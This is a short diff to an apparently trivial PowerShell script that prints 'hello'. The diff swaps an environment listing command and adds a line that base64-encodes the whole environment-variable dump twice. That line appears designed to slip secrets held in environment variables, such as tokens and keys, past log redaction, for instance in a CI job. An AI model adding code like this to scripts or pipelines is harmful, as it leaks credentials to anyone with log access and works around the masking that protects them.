@@ -1,3 +1,6 @@
 Write-Host "hello"
 
-ls env:
+gci env:
+
+
+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($(gci env:)))))
